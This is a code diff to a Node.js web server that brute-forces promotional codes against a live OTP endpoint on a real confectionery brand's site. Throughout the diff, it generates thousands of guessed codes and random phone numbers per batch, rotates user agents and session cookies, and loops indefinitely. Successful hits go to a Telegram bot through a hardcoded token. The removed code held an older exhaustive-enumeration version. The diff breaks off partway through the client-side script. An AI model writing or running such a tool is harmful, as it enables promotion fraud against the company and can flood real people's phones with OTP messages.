@@ -3,595 +3,702 @@ const http = require('http');
 const WebSocket = require('ws');
 const axios = require('axios');
 
+// ═══════════════════════════════════════════════════════════════
+//                    CONFIGURATION
+// ═══════════════════════════════════════════════════════════════
+
+const PORT = process.env.PORT || 3000;
+const BOT_TOKEN = "8468676540:AAFsb4SPSlAD-5dNUmbQARL5Sj9cXlO7Oac";
+const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+// ═══════════════════════════════════════════════════════════════
+//                    SMART BRUTEFORCER CLASS
+// ═══════════════════════════════════════════════════════════════
+
+class SmartBruteforcer {
+    constructor(ws) {
+        this.ws = ws;
+        this.chatId = null;
+        this.successCodes = new Set();
+        this.totalAttempts = 0;
+        this.batchNum = 0;
+        this.isRunning = false;
+        
+        // WORKING CODES FOR PATTERN ANALYSIS
+        this.workingCodes = ["MTWCDY", "MY6BKC", "TPHV6T", "TH6HXF", "THBK38"];
+        this.codePatterns = this.analyzeWorkingCodes();
+        
+        // TICTAC CONFIG
+        this.baseUrl = "https://www.tictac.com";
+        this.endpoint = "/in/en/xp/jarpecarpromo/home/generateOTP";
+        
+        // USER AGENTS
+        this.userAgents = [
+            'Mozilla/5.0 (Linux; Android 15; V2315) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7499.34 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 14; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36'
+        ];
+        
+        this.initTelegram();
+    }
+    
+    // ═══════════════════════════════════════════════════════════
+    //              TELEGRAM INITIALIZATION
+    // ═══════════════════════════════════════════════════════════
+    
+    async initTelegram() {
+        try {
+            const response = await axios.get(`${TELEGRAM_API}/getUpdates`, { timeout: 30000 });
+            if (response.data.result && response.data.result.length > 0) {
+                this.chatId = response.data.result[response.data.result.length - 1].message.chat.id;
+            }
+        } catch (error) {
+            this.chatId = null;
+        }
+    }
+    
+    // ═══════════════════════════════════════════════════════════
+    //              PATTERN ANALYSIS
+    // ═══════════════════════════════════════════════════════════
+    
+    analyzeWorkingCodes() {
+        const patterns = {
+            positionPatterns: {},
+            charFrequencies: {},
+            structurePatterns: [],
+            prefixSuffix: { prefix: {}, suffix: {} }
+        };
+        
+        // POSITION ANALYSIS
+        for (let position = 0; position < 6; position++) {
+            const charsAtPos = this.workingCodes.map(code => code[position]);
+            patterns.positionPatterns[position] = {
+                letters: charsAtPos.filter(c => /[A-Z]/.test(c)),
+                digits: charsAtPos.filter(c => /[0-9]/.test(c)),
+                common: [...new Set(charsAtPos)]
+            };
+        }
+        
+        // CHARACTER FREQUENCY
+        const allChars = this.workingCodes.join('');
+        for (const char of new Set(allChars)) {
+            patterns.charFrequencies[char] = (allChars.match(new RegExp(char, 'g')) || []).length;
+        }
+        
+        // STRUCTURE PATTERNS
+        for (const code of this.workingCodes) {
+            const structure = code.split('').map(c => /[A-Z]/.test(c) ? 'L' : 'D').join('');
+            patterns.structurePatterns.push(structure);
+        }
+        
+        // PREFIX/SUFFIX
+        for (const code of this.workingCodes) {
+            const prefix = code.slice(0, 2);
+            const suffix = code.slice(-2);
+            patterns.prefixSuffix.prefix[prefix] = (patterns.prefixSuffix.prefix[prefix] || 0) + 1;
+            patterns.prefixSuffix.suffix[suffix] = (patterns.prefixSuffix.suffix[suffix] || 0) + 1;
+        }
+        
+        return patterns;
+    }
+    
+    // ═══════════════════════════════════════════════════════════
+    //              SMART CODE GENERATION
+    // ═══════════════════════════════════════════════════════════
+    
+    generateSmartCodes(count = 5000) {
+        const codes = new Set(this.workingCodes);
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        
+        // STRUCTURE-BASED GENERATION
+        const structures = [...new Set(this.codePatterns.structurePatterns)];
+        for (let i = 0; i < count * 0.3; i++) {
+            const struct = structures[Math.floor(Math.random() * structures.length)];
+            let code = '';
+            for (const patternChar of struct) {
+                if (patternChar === 'L') {
+                    code += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'[Math.floor(Math.random() * 26)];
+                } else {
+                    code += Math.floor(Math.random() * 10);
+                }
+            }
+            codes.add(code);
+        }
+        
+        // POSITION-SPECIFIC GENERATION
+        for (let i = 0; i < count * 0.3; i++) {
+            let code = '';
+            for (let pos = 0; pos < 6; pos++) {
+                const posData = this.codePatterns.positionPatterns[pos];
+                const available = [...posData.letters, ...posData.digits];
+                code += available.length > 0 
+                    ? available[Math.floor(Math.random() * available.length)]
+                    : chars[Math.floor(Math.random() * chars.length)];
+            }
+            codes.add(code);
+        }
+        
+        // PREFIX/SUFFIX BASED
+        const prefixes = Object.keys(this.codePatterns.prefixSuffix.prefix);
+        const suffixes = Object.keys(this.codePatterns.prefixSuffix.suffix);
+        
+        for (let i = 0; i < count * 0.2; i++) {
+            const prefix = prefixes[Math.floor(Math.random() * prefixes.length)] || 
+                          chars.slice(0, 2);
+            const suffix = suffixes[Math.floor(Math.random() * suffixes.length)] || 
+                          chars.slice(-2);
+            const middle = Array(2).fill(0).map(() => 
+                chars[Math.floor(Math.random() * chars.length)]
+            ).join('');
+            codes.add(prefix + middle + suffix);
+        }
+        
+        // RANDOM FILL
+        while (codes.size < count) {
+            const code = Array(6).fill(0).map(() => 
+                chars[Math.floor(Math.random() * chars.length)]
+            ).join('');
+            codes.add(code);
+        }
+        
+        return Array.from(codes).slice(0, count);
+    }
+    
+    // ═══════════════════════════════════════════════════════════
+    //              PHONE GENERATION
+    // ═══════════════════════════════════════════════════════════
+    
+    generateRandomPhone() {
+        const prefix = ['7', '8', '9', '6'][Math.floor(Math.random() * 4)];
+        const remaining = Array(9).fill(0).map(() => Math.floor(Math.random() * 10)).join('');
+        return prefix + remaining;
+    }
+    
+    // ═══════════════════════════════════════════════════════════
+    //              REQUEST MAKER
+    // ═══════════════════════════════════════════════════════════
+    
+    async makeRequest(code, phone) {
+        const url = `${this.baseUrl}${this.endpoint}`;
+        const headers = {
+            'Host': 'www.tictac.com',
+            'user-agent': this.userAgents[Math.floor(Math.random() * this.userAgents.length)],
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'origin': 'https://www.tictac.com',
+            'referer': 'https://www.tictac.com/in/en/xp/jarpecarpromo/home/register/',
+            'cookie': `PHPSESSID=1vs284nnha0gcc89i53i3oo${Math.floor(Math.random() * 900) + 100}`
+        };
+        
+        try {
+            const response = await axios.post(url, 
+                `phone=${phone}&ccode=${code}`,
+                { headers, timeout: 5000 }
+            );
+            
+            this.totalAttempts++;
+            
+            if (response.status === 200) {
+                const data = response.data;
+                const isSuccess = JSON.stringify(data).toLowerCase().includes('success');
+                
+                if (isSuccess) {
+                    this.successCodes.add(code);
+                    return { code, phone, status: 'success', response: data };
+                } else {
+                    return { code, phone, status: 'failed', response: data };
+                }
+            }
+        } catch (error) {
+            return { code, phone, status: 'error', error: error.message };
+        }
+        
+        return null;
+    }
+    
+    // ═══════════════════════════════════════════════════════════
+    //              TELEGRAM NOTIFICATION
+    // ═══════════════════════════════════════════════════════════
+    
+    async sendSuccessToTelegram(code, phone) {
+        if (!this.chatId) return false;
+        
+        const message = `
+🎯 <b>SUCCESS CODE FOUND!</b>
+
+🔑 <b>Code:</b> <code>${code}</code>
+📱 <b>Phone:</b> <code>${phone}</code>
+⏰ <b>Time:</b> ${new Date().toLocaleTimeString()}
+📊 <b>Total Success:</b> ${this.successCodes.size} codes
+        `.trim();
+        
+        try {
+            await axios.post(`${TELEGRAM_API}/sendMessage`, {
+                chat_id: this.chatId,
+                text: message,
+                parse_mode: 'HTML'
+            }, { timeout: 15000 });
+            return true;
+        } catch (error) {
+            return false;
+        }
+    }
+    
+    // ═══════════════════════════════════════════════════════════
+    //              WEBSOCKET SENDER
+    // ═══════════════════════════════════════════════════════════
+    
+    sendWS(data) {
+        if (this.ws && this.ws.readyState === WebSocket.OPEN) {
+            this.ws.send(JSON.stringify(data));
+        }
+    }
+    
+    // ═══════════════════════════════════════════════════════════
+    //              BATCH EXECUTION
+    // ═══════════════════════════════════════════════════════════
+    
+    async executeBatch() {
+        this.batchNum++;
+        const startTime = Date.now();
+        
+        this.sendWS({
+            type: 'batch_start',
+            batch: this.batchNum,
+            message: `🧠 SMART BATCH #${this.batchNum} STARTED`
+        });
+        
+        // GENERATE CODES
+        const codes = this.generateSmartCodes(5000);
+        const phones = Array(5000).fill(0).map(() => this.generateRandomPhone());
+        
+        this.sendWS({
+            type: 'codes_generated',
+            count: codes.length,
+            message: `✅ Generated ${codes.length} smart pattern-based codes`
+        });
+        
+        // EXECUTE REQUESTS
+        let completed = 0;
+        let successCount = 0;
+        const batchSize = 100;
+        
+        for (let i = 0; i < codes.length; i += batchSize) {
+            const batch = codes.slice(i, i + batchSize);
+            const phoneBatch = phones.slice(i, i + batchSize);
+            
+            const promises = batch.map((code, idx) => 
+                this.makeRequest(code, phoneBatch[idx])
+            );
+            
+            const results = await Promise.allSettled(promises);
+            
+            for (const result of results) {
+                if (result.status === 'fulfilled' && result.value) {
+                    completed++;
+                    
+                    if (result.value.status === 'success') {
+                        successCount++;
+                        
+                        // SEND SUCCESS TO WEBSOCKET
+                        this.sendWS({
+                            type: 'success',
+                            code: result.value.code,
+                            phone: result.value.phone,
+                            successCount,
+                            message: `🎯 SUCCESS #${successCount}: ${result.value.code}`
+                        });
+                        
+                        // SEND TO TELEGRAM
+                        this.sendSuccessToTelegram(result.value.code, result.value.phone);
+                    }
+                    
+                    // PROGRESS UPDATE
+                    if (completed % 500 === 0) {
+                        this.sendWS({
+                            type: 'progress',
+                            completed,
+                            total: 5000,
+                            successCount,
+                            message: `📊 Progress: ${completed}/5000 | Success: ${successCount}`
+                        });
+                    }
+                }
+            }
+        }
+        
+        // BATCH COMPLETE
+        const timeTaken = ((Date.now() - startTime) / 1000).toFixed(2);
+        
+        this.sendWS({
+            type: 'batch_complete',
+            batch: this.batchNum,
+            successCount,
+            timeTaken,
+            totalSuccess: this.successCodes.size,
+            allCodes: Array.from(this.successCodes),
+            message: `✅ Batch #${this.batchNum} complete: ${successCount} successes in ${timeTaken}s`
+        });
+    }
+    
+    // ═══════════════════════════════════════════════════════════
+    //              INFINITE MODE
+    // ═══════════════════════════════════════════════════════════
+    
+    async runInfinite() {
+        this.isRunning = true;
+        
+        this.sendWS({
+            type: 'mode_start',
+            message: '🔮 INFINITE SMART MODE ACTIVATED'
+        });
+        
+        while (this.isRunning) {
+            await this.executeBatch();
+            
+            this.sendWS({
+                type: 'cooldown',
+                message: '⏰ 15 second cooldown...'
+            });
+            
+            await new Promise(resolve => setTimeout(resolve, 15000));
+        }
+    }
+    
+    stop() {
+        this.isRunning = false;
+        this.sendWS({
+            type: 'stopped',
+            message: '🛑 Bruteforce stopped'
+        });
+    }
+}
+
+// ═══════════════════════════════════════════════════════════════
+//                    EXPRESS + WEBSOCKET SERVER
+// ═══════════════════════════════════════════════════════════════
+
 const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 
-const PORT = process.env.PORT || 3000;
-
-// Configuration - UNLIMITED MODE
-const CONFIG = {
-  baseUrl: 'https://www.tictac.com',
-  endpoint: '/in/en/xp/jarpecarpromo/home/generateOTP',
-  phoneNumber: '8284084799',
-  delayMs: 300,
-  concurrentRequests: 5,
-  rotatePhones: false, // Set true agar multiple phones use karni ho
-  alternatePhones: ['8284084799', '9876543210', '7654321098'] // Multiple phones
-};
-
-// Headers with rotation
-const getHeaders = () => ({
-  'Host': 'www.tictac.com',
-  'sec-ch-ua-platform': '"Android"',
-  'x-requested-with': 'XMLHttpRequest',
-  'user-agent': `Mozilla/5.0 (Linux; Android ${10 + Math.floor(Math.random() * 5)}; V2315) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${120 + Math.floor(Math.random() * 20)}.0.0.0 Mobile Safari/537.36`,
-  'accept': 'application/json, text/javascript, */*; q=0.01',
-  'sec-ch-ua': `"Android WebView";v="143", "Chromium";v="143", "Not A(Brand";v="24"`,
-  'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-  'sec-ch-ua-mobile': '?1',
-  'origin': 'https://www.tictac.com',
-  'sec-fetch-site': 'same-origin',
-  'sec-fetch-mode': 'cors',
-  'sec-fetch-dest': 'empty',
-  'referer': 'https://www.tictac.com/in/en/xp/jarpecarpromo/home/register/',
-  'accept-encoding': 'gzip, deflate, br, zstd',
-  'accept-language': 'en-US,en;q=0.9',
-  'priority': 'u=1, i',
-  'cookie': `PHPSESSID=${generateSessionId()}`
-});
-
-// Generate unique session ID
-function generateSessionId() {
-  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
-  let id = '';
-  for (let i = 0; i < 26; i++) {
-    id += chars.charAt(Math.floor(Math.random() * chars.length));
-  }
-  return id;
-}
-
-// Generate random code
-function generateRandomCode(length = 6) {
-  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-  let code = '';
-  for (let i = 0; i < length; i++) {
-    code += chars.charAt(Math.floor(Math.random() * chars.length));
-  }
-  return code;
-}
-
-// Generate UNLIMITED codes with patterns
-function* generateUnlimitedCodes() {
-  // Common patterns
-  const prefixes = ['TT', 'TIC', 'TAC', 'PRO', 'OFF', 'WIN', 'GET', 'FREE', 'NEW', 'VIP', 'GIFT', 'SALE', 'DEAL'];
-  const suffixes = ['2024', '2025', '100', '200', '500', '1K', 'WIN', 'NOW'];
-  
-  // Known working patterns
-  yield 'MTWCDY';
-  
-  // Pattern 1: Prefix + Numbers
-  for (let prefix of prefixes) {
-    for (let i = 0; i < 10000; i++) {
-      yield `${prefix}${String(i).padStart(4, '0')}`;
-    }
-  }
-  
-  // Pattern 2: Prefix + Suffix
-  for (let prefix of prefixes) {
-    for (let suffix of suffixes) {
-      yield prefix + suffix;
-    }
-  }
-  
-  // Pattern 3: Pure numbers
-  for (let i = 100000; i < 999999; i++) {
-    yield String(i);
-  }
-  
-  // Pattern 4: Letter combinations (6 chars)
-  const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
-  for (let a of letters) {
-    for (let b of letters) {
-      for (let c of letters) {
-        for (let d of letters) {
-          for (let e of letters) {
-            for (let f of letters) {
-              yield a + b + c + d + e + f;
-            }
-          }
-        }
-      }
-    }
-  }
-  
-  // Pattern 5: Mixed alphanumeric
-  while (true) {
-    yield generateRandomCode(6);
-  }
-}
-
-// Make request with retry
-async function makeRequest(ccode, phoneNumber, retries = 2) {
-  const url = `${CONFIG.baseUrl}${CONFIG.endpoint}`;
-  
-  for (let attempt = 0; attempt <= retries; attempt++) {
-    try {
-      const response = await axios.post(url, 
-        `phone=${phoneNumber}&ccode=${ccode}`,
-        {
-          headers: getHeaders(),
-          timeout: 15000,
-          maxRedirects: 0,
-          validateStatus: () => true
-        }
-      );
-
-      const result = {
-        code: ccode,
-        phone: phoneNumber,
-        status: response.status,
-        success: false,
-        response: null,
-        timestamp: new Date().toISOString()
-      };
-
-      if (response.status === 200) {
-        const data = response.data;
-        const dataStr = JSON.stringify(data).toLowerCase();
-        
-        if (dataStr.includes('success') || dataStr.includes('otp') || dataStr.includes('sent')) {
-          result.success = true;
-          result.response = data;
-        } else {
-          result.response = data;
-        }
-      }
-
-      return result;
-    } catch (error) {
-      if (attempt === retries) {
-        return {
-          code: ccode,
-          phone: phoneNumber,
-          status: 0,
-          success: false,
-          error: error.message,
-          timestamp: new Date().toISOString()
-        };
-      }
-      await new Promise(r => setTimeout(r, 1000));
-    }
-  }
-}
-
-// UNLIMITED Brute Force Session
-class UnlimitedBruteForce {
-  constructor(ws, phoneNumber) {
-    this.ws = ws;
-    this.phoneNumber = phoneNumber || CONFIG.phoneNumber;
-    this.attempts = 0;
-    this.successfulCodes = [];
-    this.isRunning = false;
-    this.codeGenerator = generateUnlimitedCodes();
-    this.phoneIndex = 0;
-  }
-
-  send(data) {
-    if (this.ws.readyState === WebSocket.OPEN) {
-      this.ws.send(JSON.stringify(data));
-    }
-  }
-
-  getNextPhone() {
-    if (CONFIG.rotatePhones) {
-      const phone = CONFIG.alternatePhones[this.phoneIndex];
-      this.phoneIndex = (this.phoneIndex + 1) % CONFIG.alternatePhones.length;
-      return phone;
-    }
-    return this.phoneNumber;
-  }
-
-  async start() {
-    if (this.isRunning) return;
-    this.isRunning = true;
-
-    this.send({ 
-      type: 'status', 
-      message: '🚀 UNLIMITED MODE ACTIVATED - Running Forever...',
-      mode: 'UNLIMITED'
-    });
-    
-    this.send({ 
-      type: 'config', 
-      phone: this.phoneNumber, 
-      mode: 'unlimited',
-      concurrent: CONFIG.concurrentRequests
-    });
-
-    // Main unlimited loop
-    while (this.isRunning) {
-      const batch = [];
-      
-      // Get next batch of codes
-      for (let i = 0; i < CONFIG.concurrentRequests; i++) {
-        const nextCode = this.codeGenerator.next().value;
-        batch.push(nextCode);
-      }
-
-      // Process batch
-      const promises = batch.map(code => {
-        const phone = this.getNextPhone();
-        return makeRequest(code, phone);
-      });
-      
-      const results = await Promise.all(promises);
-
-      results.forEach(result => {
-        this.attempts++;
-
-        if (result.success) {
-          this.successfulCodes.push({
-            code: result.code,
-            phone: result.phone,
-            response: result.response,
-            timestamp: result.timestamp
-          });
-          
-          this.send({
-            type: 'success',
-            code: result.code,
-            phone: result.phone,
-            response: result.response,
-            attempts: this.attempts,
-            totalSuccess: this.successfulCodes.length
-          });
-        } else {
-          this.send({
-            type: 'attempt',
-            code: result.code,
-            phone: result.phone,
-            status: result.status,
-            attempts: this.attempts
-          });
-        }
-      });
-
-      // Send periodic stats
-      if (this.attempts % 100 === 0) {
-        this.send({
-          type: 'stats',
-          attempts: this.attempts,
-          successCount: this.successfulCodes.length,
-          successRate: ((this.successfulCodes.length / this.attempts) * 100).toFixed(2),
-          uptime: process.uptime()
-        });
-      }
-
-      // Delay between batches
-      await new Promise(resolve => setTimeout(resolve, CONFIG.delayMs));
-    }
-  }
-
-  stop() {
-    this.isRunning = false;
-    this.send({
-      type: 'stopped',
-      totalAttempts: this.attempts,
-      successfulCodes: this.successfulCodes,
-      message: `⏸️ Stopped after ${this.attempts} attempts. Found ${this.successfulCodes.length} working codes.`
-    });
-  }
-}
-
-// Web Interface
+// SERVE HTML PAGE
 app.get('/', (req, res) => {
-  res.send(`
-    <!DOCTYPE html>
-    <html>
-    <head>
-      <title>TicTac OTP - UNLIMITED MODE</title>
-      <meta name="viewport" content="width=device-width, initial-scale=1">
-      <style>
+    res.send(`
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🧠 Smart Bruteforcer - Real-time</title>
+    <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-          color: #fff; 
-          padding: 20px;
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #fff;
+            padding: 20px;
+            min-height: 100vh;
         }
-        .container { max-width: 1200px; margin: 0 auto; }
-        h1 { text-align: center; margin-bottom: 10px; font-size: 2.5em; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
-        .subtitle { text-align: center; margin-bottom: 30px; opacity: 0.9; }
-        .stats-grid { 
-          display: grid; 
-          grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); 
-          gap: 15px; 
-          margin-bottom: 20px; 
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: rgba(0,0,0,0.3);
+            border-radius: 15px;
+            padding: 30px;
+            backdrop-filter: blur(10px);
         }
-        .stat-card { 
-          background: rgba(255,255,255,0.1); 
-          backdrop-filter: blur(10px);
-          padding: 20px; 
-          border-radius: 15px; 
-          border: 1px solid rgba(255,255,255,0.2);
-          text-align: center;
+        h1 {
+            text-align: center;
+            font-size: 2.5em;
+            margin-bottom: 30px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
         }
-        .stat-value { font-size: 2em; font-weight: bold; margin: 10px 0; }
-        .stat-label { opacity: 0.8; font-size: 0.9em; }
-        .controls { 
-          display: flex; 
-          gap: 10px; 
-          margin-bottom: 20px; 
-          flex-wrap: wrap;
-          justify-content: center;
+        .controls {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin-bottom: 30px;
         }
-        button { 
-          padding: 15px 30px; 
-          font-size: 16px;
-          border: none;
-          border-radius: 10px;
-          cursor: pointer;
-          font-weight: bold;
-          transition: all 0.3s;
-          box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        button {
+            padding: 15px 30px;
+            font-size: 1.1em;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
         }
-        .btn-start { background: #4caf50; color: white; }
-        .btn-start:hover { background: #45a049; transform: translateY(-2px); }
-        .btn-stop { background: #f44336; color: white; }
-        .btn-stop:hover { background: #da190b; transform: translateY(-2px); }
-        .btn-clear { background: #ff9800; color: white; }
-        .btn-clear:hover { background: #e68900; transform: translateY(-2px); }
-        #log { 
-          background: rgba(0,0,0,0.5); 
-          backdrop-filter: blur(10px);
-          padding: 20px; 
-          border-radius: 15px; 
-          height: 500px; 
-          overflow-y: auto; 
-          font-family: 'Courier New', monospace; 
-          font-size: 14px;
-          border: 1px solid rgba(255,255,255,0.1);
-          margin-bottom: 20px;
+        .btn-start {
+            background: #10b981;
+            color: white;
         }
-        #log::-webkit-scrollbar { width: 10px; }
-        #log::-webkit-scrollbar-track { background: rgba(255,255,255,0.1); border-radius: 10px; }
-        #log::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.3); border-radius: 10px; }
-        .log-line { 
-          padding: 5px; 
-          margin: 2px 0; 
-          border-radius: 5px;
-          animation: fadeIn 0.3s;
+        .btn-start:hover { background: #059669; transform: scale(1.05); }
+        .btn-stop {
+            background: #ef4444;
+            color: white;
         }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        .success { background: rgba(76, 175, 80, 0.2); color: #4caf50; font-weight: bold; }
-        .error { color: #ff5252; }
-        .info { color: #64b5f6; }
-        .warning { color: #ffb74d; }
-        .success-list { 
-          background: rgba(76, 175, 80, 0.1); 
-          padding: 15px; 
-          border-radius: 10px; 
-          margin-top: 20px;
-          border: 2px solid rgba(76, 175, 80, 0.3);
+        .btn-stop:hover { background: #dc2626; transform: scale(1.05); }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 30px;
         }
-        .success-item { 
-          background: rgba(255,255,255,0.1); 
-          padding: 10px; 
-          margin: 5px 0; 
-          border-radius: 5px;
-          display: flex;
-          justify-content: space-between;
-          align-items: center;
+        .stat-card {
+            background: rgba(255,255,255,0.1);
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
         }
-        .badge { 
-          background: #4caf50; 
-          padding: 5px 10px; 
-          border-radius: 20px; 
-          font-size: 0.8em;
+        .stat-value {
+            font-size: 2em;
+            font-weight: bold;
+            color: #10b981;
         }
-        .pulse { animation: pulse 2s infinite; }
-        @keyframes pulse { 
-          0%, 100% { opacity: 1; } 
-          50% { opacity: 0.5; } 
+        .stat-label {
+            font-size: 0.9em;
+            opacity: 0.8;
+            margin-top: 5px;
         }
-      </style>
-    </head>
-    <body>
-      <div class="container">
-        <h1>🎯 TicTac OTP - UNLIMITED MODE</h1>
-        <p class="subtitle">⚡ Infinite Code Generator - Never Stops Running</p>
+        .log-container {
+            background: rgba(0,0,0,0.5);
+            border-radius: 10px;
+            padding: 20px;
+            height: 500px;
+            overflow-y: auto;
+        }
+        .log-entry {
+            padding: 10px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+            background: rgba(255,255,255,0.05);
+            animation: fadeIn 0.3s;
+        }
+        .log-success {
+            background: rgba(16, 185, 129, 0.2);
+            border-left: 4px solid #10b981;
+        }
+        .log-info {
+            background: rgba(59, 130, 246, 0.2);
+            border-left: 4px solid #3b82f6;
+        }
+        .log-error {
+            background: rgba(239, 68, 68, 0.2);
+            border-left: 4px solid #ef4444;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .success-codes {
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(16, 185, 129, 0.1);
+            border-radius: 10px;
+        }
+        .code-item {
+            display: inline-block;
+            padding: 8px 15px;
+            margin: 5px;
+            background: rgba(16, 185, 129, 0.3);
+            border-radius: 5px;
+            font-weight: bold;
+        }
+        .status {
+            text-align: center;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            font-size: 1.2em;
+            font-weight: bold;
+        }
+        .status-connected {
+            background: rgba(16, 185, 129, 0.2);
+            color: #10b981;
+        }
+        .status-disconnected {
+            background: rgba(239, 68, 68, 0.2);
+            color: #ef4444;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🧠 SMART BRUTEFORCER</h1>
         
-        <div class="stats-grid">
-          <div class="stat-card">
-            <div class="stat-label">Status</div>
-            <div class="stat-value" id="status">⏸️ Idle</div>
-          </div>
-          <div class="stat-card">
-            <div class="stat-label">Total Attempts</div>
-            <div class="stat-value" id="attempts">0</div>
-          </div>
-          <div class="stat-card">
-            <div class="stat-label">Success Codes</div>
-            <div class="stat-value success" id="success">0</div>
-          </div>
-          <div class="stat-card">
-            <div class="stat-label">Success Rate</div>
-            <div class="stat-value" id="rate">0%</div>
-          </div>
-          <div class="stat-card">
-            <div class="stat-label">Current Phone</div>
-            <div class="stat-value" id="phone" style="font-size: 1.2em;">-</div>
-          </div>
+        <div id="status" class="status status-disconnected">
+            ⚠️ Connecting to WebSocket...
         </div>
-
+        
         <div class="controls">
-          <button class="btn-start" onclick="startAttack()">🚀 Start Unlimited Attack</button>
-          <button class="btn-stop" onclick="stopAttack()">⏹️ Stop Attack</button>
-          <button class="btn-clear" onclick="clearLog()">🗑️ Clear Log</button>
+            <button class="btn-start" onclick="startInfinite()">🚀 Start Infinite Mode</button>
+            <button class="btn-stop" onclick="stop()">🛑 Stop</button>
         </div>
-
-        <div id="log"></div>
-
-        <div id="successCodes" class="success-list" style="display: none;">
-          <h3>✅ Working Codes Found:</h3>
-          <div id="successList"></div>
+        
+        <div class="stats">
+            <div class="stat-card">
+                <div class="stat-value" id="batchNum">0</div>
+                <div class="stat-label">Batch Number</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="successCount">0</div>
+                <div class="stat-label">Success Codes</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="progress">0%</div>
+                <div class="stat-label">Progress</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="totalSuccess">0</div>
+                <div class="stat-label">Total Success</div>
+            </div>
         </div>
-      </div>
-
-      <script>
+        
+        <div class="success-codes">
+            <h3>🎯 Working Codes:</h3>
+            <div id="successCodes"></div>
+        </div>
+        
+        <div class="log-container" id="logs"></div>
+    </div>
+    
+    <script>
         const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-        const ws = new WebSocket(protocol + '//' + location.host);
-        const log = document.getElementById('log');
-        const successList = document.getElementById('successList');
-        let successCodes = [];
+        const ws = new WebSocket(protocol + '//' + window.location.host);
         
         ws.onopen = () => {
-          document.getElementById('status').innerHTML = '🟢 Connected';
-          addLog('✅ Connected to UNLIMITED server', 'success');
+            document.getElementById('status').className = 'status status-connected';
+            document.getElementById('status').innerHTML = '✅ Connected to WebSocket Server';
+            addLog('🟢 WebSocket connected', 'info');
         };
-
+        
         ws.onclose = () => {
-          document.getElementById('status').innerHTML = '🔴 Disconnected';
-          addLog('❌ Disconnected from server', 'error');
+            document.getElementById('status').className = 'status status-disconnected';
+            document.getElementById('status').innerHTML = '🔴 Disconnected from Server';
+            addLog('🔴 WebSocket disconnected', 'error');
         };
         
         ws.onmessage = (event) => {
-          const data = JSON.parse(event.data);
-          
-          if (data.type === 'attempt') {
-            document.getElementById('attempts').innerText = data.attempts;
-            addLog(\`⏳ [\${data.attempts}] Testing: \${data.code} on \${data.phone} - Status: \${data.status}\`, 'info');
-          } 
-          else if (data.type === 'success') {
-            document.getElementById('success').innerText = data.totalSuccess;
-            document.getElementById('attempts').innerText = data.attempts;
-            addLog(\`🎉 SUCCESS #\${data.totalSuccess}: \${data.code} on \${data.phone}\`, 'success');
-            
-            successCodes.push(data);
-            updateSuccessList();
-          } 
-          else if (data.type === 'stats') {
-            document.getElementById('attempts').innerText = data.attempts;
-            document.getElementById('success').innerText = data.successCount;
-            document.getElementById('rate').innerText = data.successRate + '%';
-            addLog(\`📊 Stats: \${data.attempts} attempts | \${data.successCount} success | Rate: \${data.successRate}%\`, 'warning');
-          }
-          else if (data.type === 'status') {
-            document.getElementById('status').innerHTML = '🟢 Running';
-            document.getElementById('status').classList.add('pulse');
-            if (data.phone) document.getElementById('phone').innerText = data.phone;
-            addLog(data.message, 'info');
-          }
-          else if (data.type === 'stopped') {
-            document.getElementById('status').innerHTML = '⏸️ Stopped';
-            document.getElementById('status').classList.remove('pulse');
-            addLog(data.message, 'warning');
-          }
-          else if (data.type === 'config') {
-            document.getElementById('phone').innerText = data.phone;
-          }
+            const data = JSON.parse(event.data);
+            handleMessage(data);
         };
         
-        function addLog(msg, className = '') {
-          const div = document.createElement('div');
-          div.className = 'log-line ' + className;
-          div.textContent = \`[\${new Date().toLocaleTimeString()}] \${msg}\`;
-          log.appendChild(div);
